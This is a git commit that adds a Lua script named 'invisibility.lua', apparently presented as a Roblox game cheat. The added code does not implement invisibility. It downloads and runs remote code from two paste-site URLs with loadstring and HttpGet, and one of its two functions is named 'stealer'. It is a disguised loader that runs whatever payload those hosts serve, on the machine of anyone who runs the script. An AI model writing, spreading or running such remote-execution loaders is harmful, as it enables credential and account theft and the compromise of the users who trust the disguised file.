d96aedb50f315e886e630294985fa96e3175bd9e
Stillonthebus07 <jfloresnflores@gmail.com>
2026-06-26 03:42:21 -0400

    Add files via upload

---
+++ invisibility.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/RD6Aqlwyvk/0'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
